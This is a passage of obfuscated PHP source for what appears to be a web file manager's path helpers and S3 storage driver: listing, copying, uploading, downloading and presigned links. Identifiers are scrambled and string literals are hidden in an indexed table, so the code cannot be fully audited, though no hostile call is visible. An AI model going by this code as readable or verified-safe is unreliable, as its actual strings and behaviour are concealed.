mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $”ÌŞÒ»ß = DATA_THUMB . $ÜùàÄµÙ; del_file($”ÌŞÒ»ß); $‘ı÷Çã· = IO::copy($ÛÄÂ÷ğ, TEMP_FILES, !1, $ÜùàÄµÙ); if (!@file_exists($‘ı÷Çã·)) { return $½©ÙÖ¸[215]; } ImageThumb::createThumb($‘ı÷Çã·, $”ÌŞÒ»ß, $¬ä®—Å‰, $¬ä®—Å‰ * 10); if (@file_exists($”ÌŞÒ»ß)) { Cache::remove($ÜùàÄµÙ); return IO::move($”ÌŞÒ»ß, $ö¿ƒ€™—); } Cache::set($ÜùàÄµÙ, $½©ÙÖ¸[207], 600); del_file($”ÌŞÒ»ß); return $½©ÙÖ¸[216] . $‘ı÷Çã· . $½©ÙÖ¸[85]; } public function fileOutImageServer($¬¶±è³ª, $Ö¹ÃÓ‰ = 250) { $this->fileOutImage($¬¶±è³ª, $Ö¹ÃÓ‰); } public function fileNameAuto($ÔŒåç‰Ç, $òÈŞ¿¥ö, $ñö®Ğ¡š = REPEAT_RENAME, $¡¬Ÿ›© = false) { $ÊËƒ¡š¼ =& $_SERVER[Ò°Ì”İ•]; $×®Ä‹©ˆ = $ÔŒåç‰Ç === $ÊËƒ¡š¼[12] ? $òÈŞ¿¥ö : rtrim($ÔŒåç‰Ç, $ÊËƒ¡š¼[8]) . $ÊËƒ¡š¼[8] . $òÈŞ¿¥ö; if ($ñö®Ğ¡š == REPEAT_REPLACE || !$this->exist($×®Ä‹©ˆ) || $¡¬Ÿ›© && $ñö®Ğ¡š != REPEAT_RENAME_FOLDER) { return $òÈŞ¿¥ö; } if ($ñö®Ğ¡š == REPEAT_SKIP) { return !1; } $¤º¿ô­È = $ÊËƒ¡š¼[10] . get_path_ext($òÈŞ¿¥ö); $¤º¿ô­È = $¤º¿ô­È == $ÊËƒ¡š¼[10] || $¡¬Ÿ›© ? $ÊËƒ¡š¼[12] : $¤º¿ô­È; $‡ˆÔÃØ× = 1; $©è«Í¸ = substr($òÈŞ¿¥ö, 0, strlen($òÈŞ¿¥ö) - strlen($¤º¿ô­È)); $¹ïÀğûá = $©è«Í¸ . "\50{$‡ˆÔÃØ×}\x29{$¤º¿ô­È}"; while ($this->exist(rtrim($ÔŒåç‰Ç, $ÊËƒ¡š¼[8]) . $ÊËƒ¡š¼[8] . $¹ïÀğûá)) { $¹ïÀğûá = $©è«Í¸ . "\50{$‡ˆÔÃØ×}\x29{$¤º¿ô­È}"; $‡ˆÔÃØ×++; } return $¹ïÀğûá; } private function fileNameAutoList($’¼’ÎÊ¼, $Ô†ÊÖŠ, $¡£Û¢Ğ = false) { $¿Ãš“Š© =& $_SERVER[Ò°Ì”İ•]; $ıé§·Óğ = $this->listPath($’¼’ÎÊ¼, !0); $ıé§·Óğ = array_merge($ıé§·Óğ[$¿Ãš“Š©[96]], $ıé§·Óğ[$¿Ãš“Š©[97]]); $•“ÁÊú = array_to_keyvalue($ıé§·Óğ, $¿Ãš“Š©[12], $¿Ãš“Š©[32]); $ÉÏ“ŸĞ± = $¿Ãš“Š©[10] . get_path_ext($Ô†ÊÖŠ); $ÉÏ“ŸĞ± = $ÉÏ“ŸĞ± == $¿Ãš“Š©[10] || $¡£Û¢Ğ ? $¿Ãš“Š©[12] : $ÉÏ“ŸĞ±; $¢‹—¿À“ = substr($Ô†ÊÖŠ, 0, strlen($Ô†ÊÖŠ) - strlen($ÉÏ“ŸĞ±)); $®Áíûõµ = $¢‹—¿À“ . "\50\x30\x29{$ÉÏ“ŸĞ±}"; for ($³¥ºª”µ = 1; $³¥ºª”µ <= count($•“ÁÊú) + 1; $³¥ºª”µ++) { $®Áíûõµ = $¢‹—¿À“ . "\50{$³¥ºª”µ}\x29{$ÉÏ“ŸĞ±}"; if (!in_array_not_case($®Áíûõµ, $•“ÁÊú)) { return $®Áíûõµ; } } return $®Áíûõµ; } public function listAllFiles($Ğê¹Ø¥Ó, $†ŒÀ±æü) { $¾ş¨„û‡ =& $_SERVER[Ò°Ì”İ•]; if (empty($†ŒÀ±æü)) { return array(); } $¿ŒÆğàß = array_keys($†ŒÀ±æü); $êÌıÈô = array(); $Ğê¹Ø¥Ó = trim($Ğê¹Ø¥Ó, $¾ş¨„û‡[8]); foreach ($†ŒÀ±æü as $“‰¦Ó¡÷ => $ø•®ÎÉ–) { $Éäı¢šÃ = ltrim(substr(trim($“‰¦Ó¡÷, $¾ş¨„û‡[8]), strlen($Ğê¹Ø¥Ó)), $¾ş¨„û‡[8]); if (substr($“‰¦Ó¡÷, -1) == $¾ş¨„û‡[8]) { $Éäı¢šÃ = rtrim($Éäı¢šÃ, $¾ş¨„û‡[8]) . $¾ş¨„û‡[8]; } $êÌıÈô = array_merge($êÌıÈô, $this->slicePath($Éäı¢šÃ)); } $…€”Í›ı = array(); foreach (array_unique($êÌıÈô) as $…õé¸¬) { $·¢êÚ´ = array($¾ş¨„û‡[98] => $this->getPathOuter($¾ş¨„û‡[8] . $Ğê¹Ø¥Ó . $¾ş¨„û‡[8] . $…õé¸¬), $¾ş¨„û‡[89] => 1, $¾ş¨„û‡[90] => 0); if (substr($…õé¸¬, -1) != $¾ş¨„û‡[8]) { $·¢êÚ´[$¾ş¨„û‡[89]] = 0; $É…šÆ§³ = $this->getPath($Ğê¹Ø¥Ó . $¾ş¨„û‡[8] . $…õé¸¬); if (isset($†ŒÀ±æü[$É…šÆ§³])) { $¤ÇùÎ½§ = $†ŒÀ±æü[$É…šÆ§³]; if (isset($¤ÇùÎ½§[$¾ş¨„û‡[90]])) { $·¢êÚ´[$¾ş¨„û‡[90]] = intval($¤ÇùÎ½§[$¾ş¨„û‡[90]]); } if (isset($¤ÇùÎ½§[$¾ş¨„û‡[217]])) { $·¢êÚ´[$¾ş¨„û‡[99]] = intval($¤ÇùÎ½§[$¾ş¨„û‡[217]]); } } } $…€”Í›ı[] = $·¢êÚ´; } return $…€”Í›ı; } public function slicePath($ºÜƒ¿ŒÈ) { $Åš‚‘â =& $_SERVER[Ò°Ì”İ•]; $É¬œ™ß³ = explode($Åš‚‘â[8], trim($ºÜƒ¿ŒÈ, $Åš‚‘â[8])); $‡«›©‘– = 0; do { ++$‡«›©‘–; $¬ÅÖ ‚[] = implode($Åš‚‘â[8], array_slice($É¬œ™ß³, 0, $‡«›©‘–)) . $Åš‚‘â[8]; } while ($‡«›©‘– < count($É¬œ™ß³)); $¬ÅÖ ‚[count($É¬œ™ß³) - 1] = $ºÜƒ¿ŒÈ; return $¬ÅÖ ‚; } public function getHost() { $Û“öÍ­Ï =& $_SERVER[Ò°Ì”İ•]; $üşÎ”Ù = parse_url(trim($this->domain, $Û“öÍ­Ï[8])); $ƒ´Æ ÕÑ = isset($üşÎ”Ù[$Û“öÍ­Ï[218]]) ? $üşÎ”Ù[$Û“öÍ­Ï[218]] : http_type(); $”«ñî¿Æ = isset($üşÎ”Ù[$Û“öÍ­Ï[219]]) ? $üşÎ”Ù[$Û“öÍ­Ï[219]] : $üşÎ”Ù[$Û“öÍ­Ï[98]]; if (isset($üşÎ”Ù[$Û“öÍ­Ï[220]])) { $”«ñî¿Æ .= $Û“öÍ­Ï[4] . $üşÎ”Ù[$Û“öÍ­Ï[220]]; } return $ƒ´Æ ÕÑ . $Û“öÍ­Ï[221] . $”«ñî¿Æ; } public function pathEncode($¦õ•ß–À) { $ûĞìÅ‡¤ =& $_SERVER[Ò°Ì”İ•]; return str_replace($ûĞìÅ‡¤[222], $ûĞìÅ‡¤[8], rawurlencode($¦õ•ß–À)); } public function writeLog($óÅÑë¯ğ = '', $°»÷Î£ª = false) { $¿ÎĞ³¦¦ =& $_SERVER[Ò°Ì”İ•]; $ŸŒ«÷¶¸ = in_array(ACTION, array($¿ÎĞ³¦¦[223], $¿ÎĞ³¦¦[224])); if (!$ŸŒ«÷¶¸ && !GLOBAL_DEBUG) { return; } $Ö’úúÙö = $óÅÑë¯ğ; static $¥©ôäÖÌ = null; if (!$¥©ôäÖÌ) { $¥©ôäÖÌ = strtoupper($this->getType()); } $óÅÑë¯ğ = $¥©ôäÖÌ . $¿ÎĞ³¦¦[225] . $óÅÑë¯ğ; if ($°»÷Î£ª) { $•åÜ©… = error_get_last(); if ($•åÜ©…) { $óÅÑë¯ğ = array($óÅÑë¯ğ, $•åÜ©…); } } write_log($óÅÑë¯ğ, $¿ÎĞ³¦¦[226]); if ($ŸŒ«÷¶¸) { throw new Exception($Ö’úúÙö); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($çìí·õ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ò°Ì”İ•][227]; parent::__construct(); $this->_init($çìí·õ); } public function _init($ÛšêŸÙ×) { $ˆÈÉïÏ¸ =& $_SERVER[Ò°Ì”İ•]; $this->config = $ÛšêŸÙ×; foreach ($ÛšêŸÙ× as $Ÿšñ¯Ò => $·–ş¶ö) { if (isset($this->{$Ÿšñ¯Ò})) { $this->{$Ÿšñ¯Ò} = $·–ş¶ö; } } $this->endpoint = $ÛšêŸÙ×[$ˆÈÉïÏ¸[228]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $¡¶Ô¯©ö = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($¡¶Ô¯©ö, 0, 7) == $ˆÈÉïÏ¸[229]) { $¡¶Ô¯©ö = $ˆÈÉïÏ¸[230] . substr($¡¶Ô¯©ö, 7); } $this->client->setEndpoint($¡¶Ô¯©ö); if (in_array(ACTION, array($ˆÈÉïÏ¸[223], $ˆÈÉïÏ¸[224]))) { $this->client->setExceptions(); } } public function setSignVersion($…ı¬³¹ = "\x76\64") { $this->signVer = $…ı¬³¹; $this->client->setSignVersion($…ı¬³¹); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $‘˜äã‡ ) { return null; } } public function isBucketCors() { $¸İ¾ıÆò =& $_SERVER[Ò°Ì”İ•]; $éŠ“ƒ— = $this->getBucketCors(); if (!$éŠ“ƒ— || !is_array($éŠ“ƒ—)) { return !1; } if (!is_array($éŠ“ƒ—[$¸İ¾ıÆò[231]])) { $éŠ“ƒ—[$¸İ¾ıÆò[231]] = explode($¸İ¾ıÆò[50], $éŠ“ƒ—[$¸İ¾ıÆò[231]]); } if ($éŠ“ƒ—[$¸İ¾ıÆò[232]] != $¸İ¾ıÆò[233] || !in_array($¸İ¾ıÆò[233], $éŠ“ƒ—[$¸İ¾ıÆò[231]])) { return !1; } $ÈÓòÇ—À = array_map($¸İ¾ıÆò[234], $éŠ“ƒ—[$¸İ¾ıÆò[235]]); if (!is_array($ÈÓòÇ—À)) { $ÈÓòÇ—À = array(); } $œ·£” = array($¸İ¾ıÆò[236], $¸İ¾ıÆò[237], $¸İ¾ıÆò[238], $¸İ¾ıÆò[239], $¸İ¾ıÆò[240]); $ÖŸíá‚´ = array_diff($œ·£”, $ÈÓòÇ—À); return empty($ÖŸíá‚´); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($©úâ¡·È, $ÀÓüÛë = '', $Î‡’¾×¡ = REPEAT_RENAME) { $–Ş™ßúŠ = $this->setContent($©úâ¡·È, $ÀÓüÛë); if ($–Ş™ßúŠ !== !1) { return $this->getPathOuter($©úâ¡·È); } return !1; } public function mkdir($›ó‰¢, $®±Ğ­ôè = REPEAT_SKIP) { $®ºıëÓ™ =& $_SERVER[Ò°Ì”İ•]; if (empty($›ó‰¢) && $›ó‰¢ !== $®ºıëÓ™[241]) { return !1; } if ($®±Ğ­ôè && $this->_isFolder($›ó‰¢)) { return $this->getPathOuter($›ó‰¢); } $¢æ÷„ã¤ = $this->setContent($›ó‰¢, $®ºıëÓ™[12], !0); if ($¢æ÷„ã¤ !== !1) { return $this->getPathOuter($›ó‰¢); } return !1; } public function copyFile($ç§‡ç¸ã, $êÇØ¸ç, $å°°¦— = array()) { $ù¾½Æ‹ =& $_SERVER[Ò°Ì”İ•]; $ßî¯‘ = $this->objectMeta($ç§‡ç¸ã); if (!$ßî¯‘) { return !1; } if ($ßî¯‘[$ù¾½Æ‹[90]] <= 1024 * 1024 * 200) { $Ó¬»Î›Á = $this->client->copyObject($this->bucket, $ç§‡ç¸ã, $this->bucket, $êÇØ¸ç, $ù¾½Æ‹[242], $å°°¦—); } else { $Ó¬»Î›Á = $this->client->multiCopyObject($this->bucket, $ç§‡ç¸ã, $this->bucket, $êÇØ¸ç, $å°°¦—); } $Ó¬»Î›Á = $Ó¬»Î›Á ? $this->getPathOuter($êÇØ¸ç) : !1; return $Ó¬»Î›Á; } public function moveFile($¾À»¢È”, $Ó‚÷°£) { if ($this->copyFile($¾À»¢È”, $Ó‚÷°£)) { $this->delFile($¾À»¢È”); return $this->getPathOuter($Ó‚÷°£); } return !1; } public function delFile($Óˆè†š¯) { return $this->client->deleteObject($this->bucket, $Óˆè†š¯); } public function delFolder($áãÒ‡—) { $·õîÜ¢´ =& $_SERVER[Ò°Ì”İ•]; if (!$this->exist($áãÒ‡—)) { return !0; } $this->listItemCache = !1; $üêëª®‘ = $this->fileList($áãÒ‡—); $this->listItemCache = !0; $ŸĞñÜå± = trim($áãÒ‡—, $·õîÜ¢´[8]) . $·õîÜ¢´[8]; if (!empty($áãÒ‡—) && $áãÒ‡— !== $·õîÜ¢´[241] && !in_array($ŸĞñÜå±, $üêëª®‘[$·õîÜ¢´[96]])) { $üêëª®‘[$·õîÜ¢´[96]][] = $ŸĞñÜå±; } $Şığæá = $this->delByBatch($üêëª®‘[$·õîÜ¢´[97]]); if (!$Şığæá) { return !1; } $Şığæá = $this->delByBatch($üêëª®‘[$·õîÜ¢´[96]]); if (!$Şığæá) { return !1; } return $this->delFile($ŸĞñÜå±); } private function delByBatch($¬Ëáéû) { foreach (array_chunk($¬Ëáéû, 1000) as $½‹¡†Ç») { $®Ä¸Ø½ñ = $this->client->deleteObjects($this->bucket, $½‹¡†Ç»); if (!$®Ä¸Ø½ñ) { return !1; } } return !0; } public function rename($†ŞÉÅˆ, $àµ«¥) { return $this->renameObject($†ŞÉÅˆ, $àµ«¥); } public function listPath($ ¶Æ¿²ì, $©Ğ¸úş = false) { $ÖÎäöŒõ =& $_SERVER[Ò°Ì”İ•]; $‰Ÿåôö© = $this->fileList($ ¶Æ¿²ì, $ÖÎäöŒõ[8], !0); foreach ($‰Ÿåôö©[$ÖÎäöŒõ[96]] as $±ĞšÅ¦¯ => $Î½Âã) { $‰Ÿåôö©[$ÖÎäöŒõ[96]][$±ĞšÅ¦¯] = $this->folderInfo($Î½Âã, $©Ğ¸úş, $Î½Âã); } foreach ($‰Ÿåôö©[$ÖÎäöŒõ[97]] as $±ĞšÅ¦¯ => $Î½Âã) { $‰Ÿåôö©[$ÖÎäöŒõ[97]][$±ĞšÅ¦¯] = $this->fileInfo($Î½Âã[$ÖÎäöŒõ[32]], $©Ğ¸úş, $Î½Âã); } return $‰Ÿåôö©; } protected function infoChildren($ÖıúõÀ†, &$‰½”¥çš) { $·‘®†æï =& $_SERVER[Ò°Ì”İ•]; $ù‡€ÍÌ = $this->fileList($ÖıúõÀ†, $·‘®†æï[12], !0); $‰½”¥çš[$·‘®†æï[92]] += count($ù‡€ÍÌ[$·‘®†æï[96]]); $‰½”¥çš[$·‘®†æï[91]] += count($ù‡€ÍÌ[$·‘®†æï[97]]); foreach ($ù‡€ÍÌ[$·‘®†æï[97]] as $ŒÛåûÚ¡) { if (!$ŒÛåûÚ¡ || !$ŒÛåûÚ¡[$·‘®†æï[90]]) { continue; } $‰½”¥çš[$·‘®†æï[90]] += $ŒÛåûÚ¡[$·‘®†æï[90]]; } } private function fileInfo($ôÏ›ŸŠÔ, $ë³öòÓ = false, $×†Ëˆşô = array()) { $ŸÅ…ˆ =& $_SERVER[Ò°Ì”İ•]; $Ãõ“ã×à = array($ŸÅ…ˆ[32] => $this->pathThis($ôÏ›ŸŠÔ), $ŸÅ…ˆ[98] => $this->getPathOuter($ôÏ›ŸŠÔ), $ŸÅ…ˆ[33] => $ŸÅ…ˆ[243], $ŸÅ…ˆ[180] => $this->ext($ôÏ›ŸŠÔ), $ŸÅ…ˆ[90] => isset($×†Ëˆşô[$ŸÅ…ˆ[90]]) ? $×†Ëˆşô[$ŸÅ…ˆ[90]] : 0); if ($ë³öòÓ) { return $Ãõ“ã×à; } $Ãõ“ã×à[$ŸÅ…ˆ[244]] = $Ãõ“ã×à[$ŸÅ…ˆ[99]] = 0; $Ãõ“ã×à[$ŸÅ…ˆ[245]] = $Ãõ“ã×à[$ŸÅ…ˆ[246]] = !0; if (empty($×†Ëˆşô)) { $×†Ëˆşô = $this->objectMeta($ôÏ›ŸŠÔ); if (!$×†Ëˆşô) { return $Ãõ“ã×à; } } if (isset($×†Ëˆşô[$ŸÅ…ˆ[247]]) && $×†Ëˆşô[$ŸÅ…ˆ[247]]) { $Ãõ“ã×à[$ŸÅ…ˆ[248]] = $×†Ëˆşô[$ŸÅ…ˆ[247]]; } if (isset($×†Ëˆşô[$ŸÅ…ˆ[217]])) { $Ãõ“ã×à[$ŸÅ…ˆ[99]] = $×†Ëˆşô[$ŸÅ…ˆ[217]]; } if (isset($×†Ëˆşô[$ŸÅ…ˆ[90]])) { $Ãõ“ã×à[$ŸÅ…ˆ[90]] = $×†Ëˆşô[$ŸÅ…ˆ[90]]; } return $Ãõ“ã×à; } private function folderInfo($“‚Ë¸„, $æº¬ÂŒ = false, $è£òáÛ = array()) { $÷àß‘­¸ =& $_SERVER[Ò°Ì”İ•]; $…Š¶ØÏâ = array($÷àß‘­¸[32] => $this->pathThis($“‚Ë¸„), $÷àß‘­¸[98] => $this->getPathOuter($÷àß‘­¸[8] . $“‚Ë¸„), $÷àß‘­¸[33] => $÷àß‘­¸[89]); if ($æº¬ÂŒ) { return $…Š¶ØÏâ; } $…Š¶ØÏâ[$÷àß‘­¸[244]] = $…Š¶ØÏâ[$÷àß‘­¸[99]] = 0; $…Š¶ØÏâ[$÷àß‘­¸[245]] = $…Š¶ØÏâ[$÷àß‘­¸[246]] = !0; if ($“‚Ë¸„ == $÷àß‘­¸[12]) { return $…Š¶ØÏâ; } if (empty($è£òáÛ)) { $è£òáÛ = $this->objectMeta(trim($“‚Ë¸„, $÷àß‘­¸[8]) . $÷àß‘­¸[8]); } if (isset($è£òáÛ[$÷àß‘­¸[217]])) { $…Š¶ØÏâ[$÷àß‘­¸[244]] = $è£òáÛ[$÷àß‘­¸[217]]; } return $…Š¶ØÏâ; } private function fileList($ªİ“¨ŒÄ, $€“œÓıè = '', $²•ÖÅªß = 0) { $¡º÷ÓË¸ =& $_SERVER[Ò°Ì”İ•]; $–©•ç³ğ = rtrim($ªİ“¨ŒÄ, $¡º÷ÓË¸[8]) . $¡º÷ÓË¸[8]; $úäô‚Çù = $this->listObjs($–©•ç³ğ, null, null, $€“œÓıè); if (!$úäô‚Çù) { return array($¡º÷ÓË¸[96] => array(), $¡º÷ÓË¸[97] => array()); } $çóŠêÛ‚ = $•ÚÁ¯š = array(); foreach ($úäô‚Çù[$¡º÷ÓË¸[249]] as $ ‡äÀÅë) { $ÃÌ¿û£· = $ ‡äÀÅë[$¡º÷ÓË¸[32]]; if ($ÃÌ¿û£· == $–©•ç³ğ) { continue; } $ŒÃ±»²ä = isset($ ‡äÀÅë[$¡º÷ÓË¸[90]]) ? $ ‡äÀÅë[$¡º÷ÓË¸[90]] : 0; $êå—Ä = $ŒÃ±»²ä == 0 && substr($ÃÌ¿û£·, strlen($ÃÌ¿û£·) - 1, 1) == $¡º÷ÓË¸[8] ? !0 : !1; $this->cacheMethodInfoSet($ÃÌ¿û£·, $êå—Ä, $ ‡äÀÅë); if ($êå—Ä) { $çóŠêÛ‚[] = $ÃÌ¿û£·; continue; } $•ÚÁ¯š[] = $²•ÖÅªß ? $ ‡äÀÅë : $ÃÌ¿û£·; } foreach ($úäô‚Çù[$¡º÷ÓË¸[250]] as $ ‡äÀÅë) { $çóŠêÛ‚[] = $ ‡äÀÅë[$¡º÷ÓË¸[32]]; $this->cacheMethodInfoSet($ ‡äÀÅë[$¡º÷ÓË¸[32]], !0); } $this->cacheMethodInfoSet($ªİ“¨ŒÄ, !0); return array($¡º÷ÓË¸[96] => $çóŠêÛ‚, $¡º÷ÓË¸[97] => $•ÚÁ¯š); } private function listObjs($Ê±´ö”ˆ, $óÄŠ’·ù = null, $î’ø´ñ = null, $¯¨©Æ»ù = null) { $À©Ğîõ‚ =& $_SERVER[Ò°Ì”İ•]; $Ê±´ö”ˆ = trim($Ê±´ö”ˆ, $À©Ğîõ‚[8]); $‰åªÓİ = empty($Ê±´ö”ˆ) && $Ê±´ö”ˆ !== $À©Ğîõ‚[241] ? $À©Ğîõ‚[12] : $Ê±´ö”ˆ . $À©Ğîõ‚[8]; return $this->client->getBucket($this->bucket, $‰åªÓİ, $óÄŠ’·ù, $î’ø´ñ, $¯¨©Æ»ù, !0); } public function has($œÕ¥È½À, $ÈàÛúà¥ = false, $ˆ¬ú õ = true) { $†Ìï Ìù =& $_SERVER[Ò°Ì”İ•]; $œÕ¥È½À = trim($œÕ¥È½À, $†Ìï Ìù[8]); $•¸ú‘ = empty($œÕ¥È½À) && $œÕ¥È½À !== $†Ìï Ìù[241] ? $†Ìï Ìù[12] : $œÕ¥È½À . $†Ìï Ìù[8]; $ŠÍ¯Á‰ú = null; $¤ñŞãÕš = 500; $§•ÖËˆö = $†Ìï Ìù[8]; $ú¿·œç× = $÷°á¤ = array(); while (!0) { $—«ÃÀ²¥ = $this->listObjs($œÕ¥È½À, $ŠÍ¯Á‰ú, $¤ñŞãÕš, $§•ÖËˆö); if (!$—«ÃÀ²¥) { break; } $ŠÍ¯Á‰ú = $—«ÃÀ²¥[$†Ìï Ìù[251]]; $Û´¡ÈšÙ = $—«ÃÀ²¥[$†Ìï Ìù[249]]; $É¥Ã·—„ = $—«ÃÀ²¥[$†Ìï Ìù[250]]; if (empty($Û´¡ÈšÙ) && empty($É¥Ã·—„)) { break; } if (count($Û´¡ÈšÙ) == 1 && $Û´¡ÈšÙ[0][$†Ìï Ìù[32]] == $•¸ú‘) { break; } if ($ÈàÛúà¥) { if (count($Û´¡ÈšÙ)) { $Û´¡ÈšÙ = array_column($Û´¡ÈšÙ, $†Ìï Ìù[32]); $ú¿·œç× = array_merge($ú¿·œç×, $Û´¡ÈšÙ); } if (count($É¥Ã·—„)) { $É¥Ã·—„ = array_column($É¥Ã·—„, $†Ìï Ìù[32]); $÷°á¤ = array_merge($÷°á¤, $É¥Ã·—„); } if ($ŠÍ¯Á‰ú === null) { break; } continue; } if ($ˆ¬ú õ) { if (!empty($Û´¡ÈšÙ)) { if (count($Û´¡ÈšÙ) > 1 || isset($Û´¡ÈšÙ[0][$†Ìï Ìù[32]]) && $Û´¡ÈšÙ[0][$†Ìï Ìù[32]] != $•¸ú‘) { return !0; } } } else { if (!empty($É¥Ã·—„)) { return !0; } } if ($ŠÍ¯Á‰ú === null) { break; } } if ($ÈàÛúà¥) { $ú¿·œç× = array_diff($ú¿·œç×, array($•¸ú‘)); $ú¿·œç× = count(array_unique($ú¿·œç×)); $÷°á¤ = count(array_unique($÷°á¤)); return array($†Ìï Ìù[252] => $ú¿·œç×, $†Ìï Ìù[253] => $÷°á¤); } return !1; } public function listAll($†Œ’Ò«—) { $í°‹ºê =& $_SERVER[Ò°Ì”İ•]; $íïãµœ = $this->fileList($†Œ’Ò«—, $í°‹ºê[12], !0); $ºÉğì²¥ = array_to_keyvalue($íïãµœ[$í°‹ºê[97]], $í°‹ºê[32]); foreach ($íïãµœ[$í°‹ºê[96]] as $ùÅ…ÒÄ) { if (is_string($ùÅ…ÒÄ)) { $ºÉğì²¥[$ùÅ…ÒÄ] = array($í°‹ºê[90] => 0); } } return $this->listAllFiles($†Œ’Ò«—, $ºÉğì²¥); } public function canRead($¶Òâáú—) { $¯İÂÀˆ˜ =& $_SERVER[Ò°Ì”İ•]; $¯’ú˜ïÛ = $this->client->getAccessControlPolicy($this->bucket, $¶Òâáú—); if (!$¯’ú˜ïÛ) { return !1; } return in_array($¯’ú˜ïÛ, array($¯İÂÀˆ˜[254], $¯İÂÀˆ˜[255], $¯İÂÀˆ˜[256])) ? !0 : !1; } public function canWrite($óû©ş›“) { $í©á£®Æ =& $_SERVER[Ò°Ì”İ•]; $ÎÖ½˜Ñ¯ = $this->client->getAccessControlPolicy($this->bucket, $óû©ş›“); if (!$ÎÖ½˜Ñ¯) { return !1; } return in_array($ÎÖ½˜Ñ¯, array($í©á£®Æ[254], $í©á£®Æ[255])) ? !0 : !1; } public function getContent($ŸşÆñŒ) { return $this->client->getObject($this->bucket, $ŸşÆñŒ); } public function setContent($Ÿ´ŞĞÆÓ, $êæ‡êöÜ = '', $ªÄ¥”©¿ = false) { $ğ²Ö°ü° =& $_SERVER[Ò°Ì”İ•]; $Ÿ´ŞĞÆÓ = $ªÄ¥”©¿ ? trim($Ÿ´ŞĞÆÓ, $ğ²Ö°ü°[8]) . $ğ²Ö°ü°[8] : $Ÿ´ŞĞÆÓ; $œñıÙ™² = get_file_mime(get_path_ext($Ÿ´ŞĞÆÓ)); $Î–Š´¡ = $this->client->putObject($êæ‡êöÜ, $this->bucket, $Ÿ´ŞĞÆÓ, $ğ²Ö°ü°[242], array(), $œñıÙ™²); if (!$Î–Š´¡) { return !1; } if ($ªÄ¥”©¿) { return !0; } return $Î–Š´¡ ? !0 : !1; } public function fileSubstr($ûß£¸, $Ï“½½åÁ, $¡Õ—Ä›³) { $¹¬ÂĞı¼ = $Ï“½½åÁ + $¡Õ—Ä›³ - 1; return $this->client->getObject($this->bucket, $ûß£¸, array($_SERVER[Ò°Ì”İ•][257] => "\x62\x79\x74\x65\x73\x3d{$Ï“½½åÁ}\55{$¹¬ÂĞı¼}")); } public function upload($ºïµá›ó, $è¿³ªµŠ, $ãÑÉÁµŸ = false, $‡û—ò€‘ = REPEAT_REPLACE) { $…ºŞ“—¿ =& $_SERVER[Ò°Ì”İ•]; $İ†çÄ˜Ó = array($…ºŞ“—¿[258] => @md5_file($è¿³ªµŠ)); $ıì£ÈÛ× = array($…ºŞ“—¿[259] => get_file_mime(get_path_ext($ºïµá›ó))); if (IO::size($è¿³ªµŠ) <= 1024 * 1024 * 200) { $«Ğ§ãÓ¸ = $this->client->putObjectFile($è¿³ªµŠ, $this->bucket, $ºïµá›ó, $…ºŞ“—¿[242], $İ†çÄ˜Ó, $ıì£ÈÛ×); return !empty($«Ğ§ãÓ¸) ? $this->getPathOuter($ºïµá›ó) : !1; } $Ù—ôª·µ = $this->client->multiUploadObject($è¿³ªµŠ, $this->bucket, trim($ºïµá›ó, $…ºŞ“—¿[8]), $İ†çÄ˜Ó, $ıì£ÈÛ×); return $Ù—ôª·µ ? $this->getPathOuter($ºïµá›ó) : !1; } public function download($ı²‹¶ª«, $ÆÙÓÂù) { if (!@is_dir($this->pathFather($ÆÙÓÂù)) && !IO::mkdir($this->pathFather($ÆÙÓÂù))) { return !1; } $”Ô¥ÃÇ = $this->client->getObject($this->bucket, $ı²‹¶ª«, array(), $ÆÙÓÂù); return $”Ô¥ÃÇ !== !1 ? $ÆÙÓÂù : !1; } public function link($ÑàùÅáí, $ò—±¹¹ = array()) { return $this->getPreSignedURL($ÑàùÅáí, 3600 * 12, $ò—±¹¹); } private function getPreSignedURL($³¬½Ö™, $ì»ë™Ç¤, $àº®øÉ = array(), $ü°­ÕÎ = "\x47\105\124") { $Éºà´Ò  =& $_SERVER[Ò°Ì”İ•]; $³¬½Ö™ = trim($³¬½Ö™, $Éºà´Ò [8]); if ($this->signVer == $Éºà´Ò [260]) { return $this->client->getPreSignedV2URL($this->bucket, $³¬½Ö™, $ì»ë™Ç¤, $ü°­ÕÎ, $àº®øÉ); } return $this->client->getPreSignedV4URL($this->bucket, $³¬½Ö™, $ì»ë™Ç¤, array(), $ü°­ÕÎ, $àº®øÉ); } public function fileOut($§ƒÑÀœË, $›ÎƒŒ« = false, $Ê«Éµº = false, $‰¾©»Í¤ = '') { $ìøùâ± =& $_SERVER[Ò°Ì”İ•]; if ($this->isFileOutServer()) { return $this->fileOutServer($§ƒÑÀœË, $›ÎƒŒ«, $Ê«Éµº, $‰¾©»Í¤); } if (!$Ê«Éµº) { $Ê«Éµº = $this->pathThis($§ƒÑÀœË); } $üã÷âá— = get_file_mime(get_path_ext($Ê«Éµº)); if ($üã÷âá— == $ìøùâ±[261]) { return parent::fileOut($§ƒÑÀœË, $›ÎƒŒ«, $Ê«Éµº, $‰¾©»Í¤); } $à’±ß = array($ìøùâ±[262] => $üã÷âá—); if ($›ÎƒŒ«) { $à’±ß[$ìøùâ±[263]] = $ìøùâ±[264] . rawurlencode($Ê«Éµº); } else { } $ë ¢Ò²ì = $this->link($§ƒÑÀœË, $à’±ß); $this->fileOutLink($ë ¢Ò²ì); } public function fileOutServer($„ú¡âëÖ, $òÙ•› = false, $®áÌòîÒ = false, $îº‹“Õ = '') { parent::fileOut($„ú¡âëÖ, $òÙ•›, $®áÌòîÒ, $îº‹“Õ); } public function fileOutImageServer($ı€Ã…–, $†ÇÄçÛ = 250) { parent::fileOutImage($ı€Ã…–, $†ÇÄçÛ); } public function hashMd5($ĞØİ†ÁÄ, $–Êì¿â­ = '') { $¡Ÿ×»ñì = $this->objectMeta($ĞØİ†ÁÄ); if (!$¡Ÿ×»ñì) { return !1; } 